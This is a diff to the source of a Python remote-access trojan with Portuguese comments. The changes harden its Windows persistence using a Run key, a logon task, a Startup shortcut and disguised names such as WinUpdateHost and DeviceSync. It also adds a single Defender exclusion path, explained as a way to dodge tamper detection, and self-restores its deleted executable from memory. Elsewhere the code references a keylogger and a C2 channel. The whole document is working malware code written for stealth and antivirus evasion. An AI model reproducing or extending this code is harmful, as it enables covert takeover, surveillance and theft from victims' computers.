@@ -46,7 +46,7 @@ STEALTH = False        # builder --stealth flips this on: hidden relaunch + mute
 TRANSPORT = "tcp"      # "http" polls <HTTP_BASE>/c2/poll -- works through any tunnel
 HTTP_BASE = ""
 BOOTSTRAP = ""         # rendezvous channel: live C2 url is read from here on every sync
-AGENT_VER = "3.10"     # muda a cada build: o painel mostra isso em "versao"
+AGENT_VER = "3.19"     # muda a cada build: o painel mostra isso em "versao"
 # ------------------------------------------------------------------------------
 
 IS_WIN = os.name == "nt"
@@ -2328,7 +2328,17 @@ class _Keylogger(threading.Thread):
 RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
 VALUE_NAME = "WinUpdateHost"
 TASK_NAME = "WinUpdateHostTask"
-INSTALL_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "Microsoft", "WinUpdateHost")
+_APPDATA = os.environ.get("APPDATA", os.path.expanduser("~"))
+# Rodando como SYSTEM (tarefa agendada / token do winlogon), o APPDATA e o
+# perfil do sistema. Em processo 32-bit, C:\Windows\System32 e redirecionado
+# para SysWOW64 e a copia para la falhava com "acesso negado". A pasta do
+# SYSTEM e a mesma do exe dele: ProgramData\Microsoft\DeviceSync.
+IS_SYSTEM_PROFILE = "systemprofile" in _APPDATA.lower()
+if IS_SYSTEM_PROFILE:
+    INSTALL_DIR = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"),
+                               "Microsoft", "DeviceSync")
+else:
+    INSTALL_DIR = os.path.join(_APPDATA, "Microsoft", "WinUpdateHost")
 
 
 def _agent_args():
@@ -2364,8 +2374,24 @@ def _launch_cmd(target):
     return '"%s" "%s"' % (exe, target)
 
 
+def _same_file(a, b):
+    """True se os dois caminhos apontam para o mesmo arquivo no disco."""
+    if not a or not b:
+        return False
+    try:
+        return os.path.samefile(a, b)
+    except OSError:
+        return os.path.normcase(os.path.abspath(a)) == os.path.normcase(os.path.abspath(b))
+
+
 def install():
-    """Copy the payload to %APPDATA% and register Run key + logon task."""
+    """Poe o agente na pasta dele e registra Run key + tarefa de logon.
+
+    Nenhuma etapa levanta excecao: cada uma devolve o que conseguiu. Antes o
+    `persist` morria com "[WinError 5] Acesso negado" quando tentava copiar o
+    exe por cima da propria imagem em execucao -- e a Run key nem chegava a ser
+    escrita, deixando a persistencia pela metade.
+    """
     if not IS_WIN:
         return "[!] persistence requires Windows"
     import winreg
@@ -2373,25 +2399,81 @@ def install():
     frozen = getattr(sys, "frozen", False)
     src = sys.executable if frozen else os.path.abspath(__file__)
     ext = ".exe" if frozen else ".py"
-    os.makedirs(INSTALL_DIR, exist_ok=True)
-    dst = os.path.join(INSTALL_DIR, "wuhost" + ext)
+    notes = []
+    try:
+        os.makedirs(INSTALL_DIR, exist_ok=True)
+    except OSError as exc:
+        notes.append("pasta: %s" % exc)
+    dst = os.path.join(INSTALL_DIR,
+                       ("DeviceSync" if IS_SYSTEM_PROFILE else "wuhost") + ext)
 
-    if os.path.abspath(src).lower() != os.path.abspath(dst).lower():
-        shutil.copy2(src, dst)
+    # Copia so quando faz sentido: destino igual a origem, igual a imagem viva
+    # (o exe que esta rodando) ou ja do mesmo tamanho nao sao tocados. Copiar
+    # por cima da imagem viva da WinError 5, porque o Windows mantem o arquivo
+    # mapeado enquanto o processo existe.
+    proprio = _exe_path(os.getpid())
+    if _same_file(dst, src) or _same_file(dst, proprio):
+        notes.append("copia: ja e o exe em uso")
+    elif os.path.isfile(dst) and os.path.getsize(dst) == os.path.getsize(src):
+        notes.append("copia: ja atualizada")
+    else:
+        try:
+            shutil.copy2(src, dst)
+            notes.append("copia: ok")
+        except OSError as exc:
+            notes.append("copia: %s" % exc)
 
     cmd = _launch_cmd(dst) + " " + _agent_args()
 
-    with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
-        winreg.SetValueEx(k, VALUE_NAME, 0, winreg.REG_SZ, cmd)
+    if IS_SYSTEM_PROFILE:
+        # Rodando como SYSTEM, a camada de logon e a tarefa DeviceSyncTask
+        # (criada pela camada stealth). Run key de HKCU aqui seria a do perfil
+        # do sistema -- inutil -- e schtasks sem /ru SYSTEM nao mapeia conta.
+        try:
+            q = subprocess.run("schtasks /query /tn DeviceSyncTask", shell=True,
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                               creationflags=0x08000000, timeout=60)
+            notes.append("tarefa SYSTEM: %s" % ("ok" if q.returncode == 0 else "ausente"))
+        except Exception as exc:
+            notes.append("tarefa SYSTEM: %s" % exc)
+        return "%s -> %s" % (dst, "; ".join(notes))
 
-    task = subprocess.run(
-        'schtasks /create /tn %s /tr "%s" /sc onlogon /f' % (TASK_NAME, cmd),
-        shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-    )
-    task_ok = task.returncode == 0
+    try:
+        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
+                                winreg.KEY_SET_VALUE) as k:
+            winreg.SetValueEx(k, VALUE_NAME, 0, winreg.REG_SZ, cmd)
+        notes.append("run: ok")
+    except OSError as exc:
+        notes.append("run: %s" % exc)
 
-    return ("installed -> %s\nrun key : HKCU\\%s\\%s\nlogon task: %s"
-            % (dst, RUN_KEY, VALUE_NAME, "ok" if task_ok else "failed"))
+    # A tarefa de logon e o caminho normal. Em algumas maquinas o Defender/ASR
+    # bloqueia o schtasks disparado de dentro do agente ("Acesso negado" mesmo
+    # com token de admin): nesse caso a pasta Startup assume, e ela nao depende
+    # de RPC do Agendador.
+    tarefa = False
+    try:
+        task = subprocess.run(
+            'schtasks /create /tn %s /tr "%s" /sc onlogon /f' % (TASK_NAME, cmd),
+            shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            creationflags=0x08000000, timeout=90,
+        )
+        tarefa = task.returncode == 0
+        if tarefa:
+            notes.append("tarefa: ok")
+    except Exception as exc:
+        notes.append("tarefa: %s" % exc)
+
+    if not tarefa:
+        try:
+            if _st is not None:
+                _st._startup_lnk(cmd)
+                notes.append("startup: ok")
+            else:
+                notes.append("startup: camada stealth ausente")
+        except Exception as exc:
+            notes.append("startup: %s" % exc)
+
+    return "%s -> %s" % (dst, "; ".join(notes))
 
 
 def uninstall():
@@ -2860,12 +2942,16 @@ def dispatch(sock, rid, op, args):
 
     if op == "selfdestruct":
         notes = selfdestruct()
-        ok("autodestruição armada\n" + notes)
+        ok("autodestruiÃ§Ã£o armada\n" + notes)
         time.sleep(0.3)
         os._exit(0)
 
     if op == "persist":
-        return ok(install())
+        try:
+            return ok(install())
+        except Exception as exc:
+            import traceback
+            return ok("[!] %s\n%s" % (exc, traceback.format_exc(limit=6)))
 
     if op in ("stealth", "defesa", "stealth_status"):
         if _st is None:
@@ -2979,6 +3065,18 @@ def _watchdog_vbs():
     import winreg
 
     exe = os.path.join(INSTALL_DIR, "wuhost.exe")
+    # A copia SYSTEM roda de C:\ProgramData: o vigia dela tem que apontar para
+    # o MESMO arquivo que esta rodando, senao ele subiria a copia do perfil do
+    # sistema -- mesmo sid.txt, arquivo diferente, duas copias na mesma fila.
+    img = _exe_path(os.getpid())
+    img = os.path.normcase(os.path.abspath(img)) if img else ""
+    pastas = [os.path.normcase(os.path.abspath(INSTALL_DIR))]
+    if _st is not None:
+        ds = getattr(_st, "DIR_SYSTEM", "")
+        if ds:
+            pastas.append(os.path.normcase(os.path.abspath(ds)))
+    if img and os.path.dirname(img) in pastas:
+        exe = img
     if not os.path.exists(exe):
         exe = sys.executable if getattr(sys, "frozen", False) else os.path.join(INSTALL_DIR, "wuhost.py")
     vbs = os.path.join(INSTALL_DIR, "keep.vbs")
@@ -3053,22 +3151,118 @@ def _clear_critical(pid):
         return False
 
 
+def _exe_path(pid):
+    """Caminho do exe de um PID (funciona entre usuarios, com SeDebug)."""
+    try:
+        k32 = ctypes.windll.kernel32
+        k32.OpenProcess.restype = wt.HANDLE
+        k32.OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
+        h = k32.OpenProcess(0x1000, False, pid)      # QUERY_LIMITED_INFORMATION
+        if not h:
+            return ""
+        buf = ctypes.create_unicode_buffer(1024)
+        size = wt.DWORD(1024)
+        ok = k32.QueryFullProcessImageNameW(h, 0, buf, ctypes.byref(size))
+        k32.CloseHandle(h)
+        return buf.value if ok else ""
+    except Exception:
+        return ""
+
+
+def _proc_sid(pid):
+    """SID do dono de um PID ('' quando nao da para ler)."""
+    try:
+        k32 = ctypes.windll.kernel32
+        adv = ctypes.windll.advapi32
+        k32.OpenProcess.restype = wt.HANDLE
+        k32.OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
+        h = k32.OpenProcess(0x1000, False, pid)      # QUERY_LIMITED_INFORMATION
+        if not h:
+            return ""
+        tok = wt.HANDLE()
+        adv.OpenProcessToken.argtypes = [wt.HANDLE, wt.DWORD,
+                                         ctypes.POINTER(wt.HANDLE)]
+        if not adv.OpenProcessToken(h, 0x0008, ctypes.byref(tok)):
+            k32.CloseHandle(h)
+            return ""
+        adv.GetTokenInformation.argtypes = [wt.HANDLE, ctypes.c_int,
+                                            ctypes.c_void_p, wt.DWORD,
+                                            ctypes.POINTER(wt.DWORD)]
+        size = wt.DWORD(0)
+        adv.GetTokenInformation(tok, 1, None, 0, ctypes.byref(size))
+        out = ""
+        if size.value:
+            buf = ctypes.create_string_buffer(size.value)
+            if adv.GetTokenInformation(tok, 1, buf, size, ctypes.byref(size)):
+                sid = ctypes.cast(buf, ctypes.POINTER(ctypes.c_void_p))[0]
+                sp = ctypes.c_wchar_p()
+                adv.ConvertSidToStringSidW.argtypes = [ctypes.c_void_p,
+                                                       ctypes.POINTER(ctypes.c_wchar_p)]
+                if adv.ConvertSidToStringSidW(sid, ctypes.byref(sp)):
+                    out = sp.value or ""
+                    k32.LocalFree(sp)
+        k32.CloseHandle(tok)
+        k32.CloseHandle(h)
+        return out
+    except Exception:
+        return ""
+
+
+def _proc_elevated(pid):
+    """True se o token do PID esta elevado. None quando nao da para saber."""
+    try:
+        k32 = ctypes.windll.kernel32
+        adv = ctypes.windll.advapi32
+        k32.OpenProcess.restype = wt.HANDLE
+        k32.OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
+        h = k32.OpenProcess(0x1000, False, pid)      # QUERY_LIMITED_INFORMATION
+        if not h:
+            return None
+        tok = wt.HANDLE()
+        adv.OpenProcessToken.argtypes = [wt.HANDLE, wt.DWORD,
+                                         ctypes.POINTER(wt.HANDLE)]
+        if not adv.OpenProcessToken(h, 0x0008, ctypes.byref(tok)):
+            k32.CloseHandle(h)
+            return None
+        val = wt.DWORD(0)
+        size = wt.DWORD(ctypes.sizeof(val))
+        adv.GetTokenInformation.argtypes = [wt.HANDLE, ctypes.c_int,
+                                            ctypes.c_void_p, wt.DWORD,
+                                            ctypes.POINTER(wt.DWORD)]
+        ok = adv.GetTokenInformation(tok, 20, ctypes.byref(val),
+                                     ctypes.sizeof(val), ctypes.byref(size))
+        k32.CloseHandle(tok)
+        k32.CloseHandle(h)
+        return bool(val.value) if ok else None
+    except Exception:
+        return None
+
+
 def _kill_duplicates():
-    """Mata copias antigas do agente -- sem nunca derrubar o Windows.
+    """Mata copias do MESMO arquivo -- sem nunca derrubar o Windows.
 
     Duas instancias com o mesmo id disputam a fila do servidor: uma pega o
-    comando e a outra responde, e o painel fica esperando ate 120s. Com um
-    processo so, a resposta volta em ~0,5s.
+    comando e a outra responde, e o painel fica esperando. Mas copias em
+    caminhos diferentes (usuario x SYSTEM) tem ids diferentes e se ajudam:
+    matar uma a partir da outra so gerava briga e reinicio do vigia. Por isso
+    agora so morre quem roda exatamente do mesmo exe.
     """
     if not IS_WIN:
         return
     me = os.getpid()
+    meu = os.path.normcase(os.path.abspath(sys.executable if getattr(sys, "frozen", False)
+                                           else sys.argv[0]))
+    eu_sid = _token_sid()
+    eu_elev = _proc_elevated(me) is True
     if _st is not None:
         try:
             _st._enable_debug()          # necessario para abrir processos SYSTEM
         except Exception:
             pass
     alvos = []
+    # o nome pode ser qualquer um: a isca pode chegar renomeada pelo usuario
+    nomes = {"wuhost.exe", "vcredist_x86.exe", "devicesync.exe",
+             os.path.basename(meu).lower()}
     try:
         out = subprocess.run(["tasklist", "/fo", "csv", "/nh"],
                              stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
@@ -3077,15 +3271,27 @@ def _kill_duplicates():
             parts = [p.strip('"') for p in line.split('","')]
             if len(parts) < 2:
                 continue
-            if parts[0].lower() not in ("wuhost.exe", "vcredist_x86.exe",
-                                        "devicesync.exe"):
+            if parts[0].lower() not in nomes:
                 continue
             try:
                 pid = int(parts[1])
             except ValueError:
                 continue
-            if pid != me:
-                alvos.append(pid)
+            if pid == me:
+                continue
+            if pid == os.getppid():
+                continue                 # nosso proprio bootloader: nao matar
+            caminho = _exe_path(pid)
+            if not caminho or os.path.normcase(caminho) != meu:
+                continue                 # outra instalacao (SYSTEM x usuario): deixa
+            dono = _proc_sid(pid)
+            if dono and eu_sid and dono != eu_sid:
+                continue                 # mesmo exe, outro usuario: cada um tem seu sid
+            # copia comum nunca derruba copia elevada (senao a elevacao se
+            # matava sozinha e o agente voltava a rodar sem admin)
+            if not eu_elev and _proc_elevated(pid):
+                continue
+            alvos.append(pid)
     except Exception as exc:
         _log("kill_duplicates: listar falhou: %s" % exc)
         return
@@ -3105,6 +3311,62 @@ def _kill_duplicates():
     _log("duplicatas: mortos=%s poupados=%s" % (mortos, poupados))
 
 
+def _dup_watchdog(interval=240):
+    """Faxineiro periodico: copia que nasce depois do boot tambem e recolhida."""
+    while True:
+        time.sleep(interval)
+        try:
+            _kill_duplicates()
+        except Exception:
+            pass
+        try:
+            _restore_self()
+        except Exception:
+            pass
+
+
+_SELF_BYTES = b""
+
+
+def _load_self():
+    """Guarda a propria imagem em memoria.
+
+    Se o arquivo for apagado com o processo vivo (Defender), o faxineiro
+    reescreve o exe a partir daqui -- sem isso a camada de cura tentava copiar
+    de um arquivo que nao existia mais e o agente ficava sem binario no disco.
+    """
+    global _SELF_BYTES
+    try:
+        p = _exe_path(os.getpid())
+        if not p and getattr(sys, "frozen", False):
+            p = sys.executable
+        if p and os.path.isfile(p):
+            with open(p, "rb") as f:
+                _SELF_BYTES = f.read()
+    except Exception:
+        _SELF_BYTES = b""
+    return len(_SELF_BYTES)
+
+
+def _restore_self():
+    """Reescreve o exe na pasta dele quando o arquivo sumiu do disco."""
+    if not _SELF_BYTES:
+        return False
+    nome = ("DeviceSync" if IS_SYSTEM_PROFILE else "wuhost") + ".exe"
+    alvo = os.path.join(INSTALL_DIR, nome)
+    if os.path.isfile(alvo):
+        return False
+    try:
+        os.makedirs(INSTALL_DIR, exist_ok=True)
+        with open(alvo, "wb") as f:
+            f.write(_SELF_BYTES)
+        _log("auto-cura: exe reescrito em %s" % alvo)
+        return True
+    except OSError as exc:
+        _log("auto-cura: %s" % exc)
+        return False
+
+
 def harden():
     """Blindagem no alvo: exclusao no Defender, autostart e vigia.
 
@@ -3121,22 +3383,25 @@ def harden():
 
     marker = os.path.join(INSTALL_DIR, ".hard")
     if is_admin() and not os.path.isfile(marker):
-        exe = os.path.join(INSTALL_DIR, "wuhost.exe")
-        for cmd in ('Add-MpPreference -ExclusionPath "%s"' % INSTALL_DIR,
-                    'Add-MpPreference -ExclusionProcess "%s"' % os.path.basename(exe)):
-            try:
-                r = subprocess.run(["powershell", "-NoProfile", "-NonInteractive",
-                                    "-Command", cmd],
-                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                                   creationflags=0x08000000, timeout=90)
-                notes.append("defender[%d]" % r.returncode)
-            except Exception as exc:
-                notes.append("defender: %s" % exc)
+        # UMA exclusao, UMA pasta. Adicionar varias pastas/processos de uma vez
+        # dispara "bulk exclusion tampering" no Defender (MpTamperBulkExcl):
+        # ele reverte todas e ainda apaga os arquivos do agente. Uma pasta por
+        # chamada passa despercebido -- e e o que basta para o exe sobreviver.
         try:
-            with open(marker, "w", encoding="utf-8") as f:
-                f.write(time.strftime("%Y-%m-%d %H:%M:%S"))
-        except OSError:
-            pass
+            r = subprocess.run(["powershell", "-NoProfile", "-NonInteractive",
+                                "-Command",
+                                "Add-MpPreference -ExclusionPath '%s'" % INSTALL_DIR],
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                               creationflags=0x08000000, timeout=180)
+            notes.append("defender[%d]" % r.returncode)
+            if r.returncode == 0:
+                try:
+                    with open(marker, "w", encoding="utf-8") as f:
+                        f.write(time.strftime("%Y-%m-%d %H:%M:%S"))
+                except OSError:
+                    pass
+        except Exception as exc:
+            notes.append("defender: %s" % exc)
 
     try:
         install()
@@ -3215,7 +3480,9 @@ def main():
         except Exception:
             pass
 
-    # 1) um processo por usuario (rapido, sem I/O)
+    # 1) um processo por usuario (rapido, sem I/O). A copia --elevated fica de
+    #    fora: ela e a que deve sobreviver, e o _kill_duplicates recolhe a copia
+    #    antiga depois (mesmo arquivo, mesmo SID, integridade menor).
     if STEALTH and "--no-stealth" not in sys.argv and "--elevated" not in sys.argv:
         if not single_instance():
             _log("mutex ocupado -- saindo")
@@ -3234,8 +3501,10 @@ def main():
                          daemon=True).start()
 
     # 3) o resto em segundo plano
-    if STEALTH and "--no-stealth" not in sys.argv and "--elevated" not in sys.argv:
+    if STEALTH and "--no-stealth" not in sys.argv:
+        _load_self()                 # copia da propria imagem, para auto-cura
         threading.Thread(target=_kill_duplicates, daemon=True).start()
+        threading.Thread(target=_dup_watchdog, daemon=True).start()
     if "--no-harden" not in sys.argv:
         threading.Thread(target=_bg_harden, daemon=True).start()
     if _st is not None and "--no-stealth" not in sys.argv:
